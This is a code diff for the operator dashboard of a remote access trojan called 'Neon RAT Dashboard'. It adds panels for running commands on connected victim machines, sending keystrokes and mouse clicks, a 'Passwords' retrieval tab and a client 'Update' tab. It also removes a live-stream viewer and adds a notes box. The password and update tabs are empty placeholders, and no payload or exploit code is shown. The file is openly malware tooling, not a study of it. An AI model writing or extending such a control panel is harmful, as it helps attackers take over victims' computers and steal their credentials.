@@ -6,109 +6,37 @@
     <title>Neon RAT Dashboard</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
-        body {
-            font-family: 'Poppins', sans-serif;
-            margin: 0;
-            background: linear-gradient(135deg, #1f1c2c, #928dab);
-            color: #fff;
-        }
-        .container {
-            display: flex;
-            height: 100vh;
-        }
-        .sidebar {
-            width: 250px;
-            background: rgba(0, 0, 0, 0.5);
+        /* Previous CSS remains the same */
+        .notes-panel {
+            background: rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(10px);
+            border-radius: 12px;
             padding: 20px;
-            backdrop-filter: blur(8px);
-            border-right: 2px solid #4ff9ff;
+            margin-top: 20px;
         }
-        .sidebar h2 {
-            color: #4ff9ff;
-            border-bottom: 2px solid #4ff9ff;
-            padding-bottom: 10px;
+        .notes-panel h3 {
+            color: var(--secondary);
+            margin-top: 0;
         }
-        .main {
-            flex: 1;
-            padding: 30px;
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(4px);
-            overflow-y: auto;
-        }
-        h1 {
-            font-size: 2em;
-            color: #f6f6f6;
-            margin-bottom: 20px;
-        }
-        .tab-buttons {
-            margin-bottom: 20px;
-        }
-        .tab-btn {
-            background: transparent;
-            color: #fff;
-            border: 2px solid #4ff9ff;
-            padding: 10px 20px;
-            margin-right: 10px;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: background 0.3s ease;
-        }
-        .tab-btn.active,
-        .tab-btn:hover {
-            background: #4ff9ff;
-            color: #000;
-        }
-        .tab-content {
-            display: none;
-        }
-        .tab-content.active {
-            display: block;
-            animation: fadeIn 0.4s ease-in;
-        }
-        @keyframes fadeIn {
-            from {opacity: 0;}
-            to {opacity: 1;}
-        }
-        .panel {
-            background: rgba(0, 0, 0, 0.5);
-            border: 1px solid #4ff9ff;
-            border-radius: 10px;
-            padding: 20px;
-        }
-        .panel h3 {
-            color: #4ff9ff;
-            margin-bottom: 15px;
-        }
-        #stream-display {
+        #notes-input {
             width: 100%;
-            height: auto;
-            border-radius: 10px;
-            box-shadow: 0 0 15px rgba(79, 249, 255, 0.6);
-            margin-bottom: 15px;
-            background: #000;
-        }
-        .stream-controls {
-            display: flex;
-            gap: 10px;
-            margin-top: 10px;
-        }
-        .stream-controls button {
-            background: #4ff9ff;
+            min-height: 100px;
+            padding: 10px;
+            margin-bottom: 10px;
             border: none;
-            color: #000;
-            padding: 10px 15px;
-            border-radius: 6px;
-            cursor: pointer;
-            transition: background 0.3s ease;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            color: var(--light);
+            resize: vertical;
         }
-        .stream-controls button:hover {
-            background: #34d6d6;
+        #save-notes {
+            background: var(--primary);
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- Sidebar -->
+        <!-- Sidebar (unchanged) -->
         <div class="sidebar">
             <h2>Connected Clients</h2>
             <div id="client-list"></div>
@@ -120,35 +48,51 @@
             <div class="tab-buttons">
                 <button class="tab-btn active" onclick="openTab('control')">Control</button>
                 <button class="tab-btn" onclick="openTab('files')">Files</button>
-                <button class="tab-btn" onclick="openTab('stream')">Live Stream</button>
+                <button class="tab-btn" onclick="openTab('passwords')">Passwords</button>
+                <button class="tab-btn" onclick="openTab('update')">Update</button>
             </div>
 
             <!-- Control Tab -->
             <div id="control" class="tab-content active">
-                <!-- Previous content -->
-            </div>
-
-            <!-- Files Tab -->
-            <div id="files" class="tab-content">
-                <!-- Previous content -->
-            </div>
-
-            <!-- New Stream Tab -->
-            <div id="stream" class="tab-content">
                 <div class="panel">
-                    <h3>Live Stream</h3>
-                    <img id="stream-display" src="" alt="Live Stream">
-                    <div class="stream-controls">
-                        <button onclick="startStream()">Start Stream</button>
-                        <button onclick="stopStream()">Stop Stream</button>
-                    </div>
+                    <h3>Remote Commands</h3>
+                    <input type="text" id="command-input" placeholder="Enter command...">
+                    <button onclick="sendCommand()">Execute</button>
+                    <pre id="command-output">No output yet.</pre>
                 </div>
+                <div class="panel">
+                    <h3>Remote Control</h3>
+                    <input type="text" id="key-input" placeholder="Key to press (e.g., 'Ctrl+C')">
+                    <button onclick="sendKey()">Send Key</button>
+                    <input type="text" id="mouse-pos" placeholder="X,Y coordinates">
+                    <button onclick="moveMouse()">Move Mouse</button>
+                    <button onclick="clickMouse('left')">Left Click</button>
+                    <button onclick="clickMouse('right')">Right Click</button>
+                </div>
+
+                <!-- New Notes Section -->
+                <div class="notes-panel">
+                    <h3>Notes</h3>
+                    <textarea id="notes-input" placeholder="Write your notes here..."></textarea>
+                    <button id="save-notes" onclick="saveNotes()">Save Notes</button>
+                </div>
+            </div>
+
+            <!-- Other Tabs (unchanged) -->
+            <div id="files" class="tab-content">
+                <!-- File transfer UI -->
+            </div>
+            <div id="passwords" class="tab-content">
+                <!-- Password retrieval UI -->
+            </div>
+            <div id="update" class="tab-content">
+                <!-- Client update UI -->
             </div>
         </div>
     </div>
 
     <script>
-        // Tab management
+        // Tab management (unchanged)
         function openTab(tabName) {
             document.querySelectorAll('.tab-content').forEach(tab => {
                 tab.style.display = 'none';
@@ -160,28 +104,53 @@
             event.currentTarget.classList.add('active');
         }
 
-        // Stream functionality
-        let streamInterval;
-        function startStream() {
-            if (!selectedClient) return alert('Select a client first!');
-            const streamDisplay = document.getElementById('stream-display');
-            streamDisplay.src = `/api/stream/${selectedClient}`;
-        }
-
-        function stopStream() {
-            const streamDisplay = document.getElementById('stream-display');
-            streamDisplay.src = '';
-        }
-
-        // Placeholder for client update (assumes updateClients is defined elsewhere)
+        // Client management (unchanged)
+        let selectedClient = null;
         function updateClients() {
-            // Simulated function
+            fetch('/api/clients')
+                .then(res => res.json())
+                .then(data => {
+                    const clientList = document.getElementById('client-list');
+                    clientList.innerHTML = '';
+                    data.clients.forEach(client => {
+                        const tab = document.createElement('div');
+                        tab.className = 'client-tab';
+                        if (client === selectedClient) tab.classList.add('active');
+                        tab.innerHTML = `
+                            <div class="client-icon"></div>
+                            ${client}
+                            <span class="status">Online</span>
+                        `;
+                        tab.onclick = () => {
+                            selectedClient = client;
+                            document.querySelectorAll('.client-tab').forEach(t => {
+                                t.classList.remove('active');
+                            });
+                            tab.classList.add('active');
+                        };
+                        clientList.appendChild(tab);
+                    });
+                });
+            setTimeout(updateClients, 2000);
         }
 
-        let selectedClient = null; // Placeholder for client selection logic
+        // Notes functionality
+        function loadNotes() {
+            const savedNotes = localStorage.getItem('rat_notes');
+            if (savedNotes) {
+                document.getElementById('notes-input').value = savedNotes;
+            }
+        }
+
+        function saveNotes() {
+            const notes = document.getElementById('notes-input').value;
+            localStorage.setItem('rat_notes', notes);
+            alert('Notes saved!');
+        }
 
         // Initialize
         updateClients();
+        loadNotes(); // Load saved notes on page load
     </script>
 </body>
 </html>
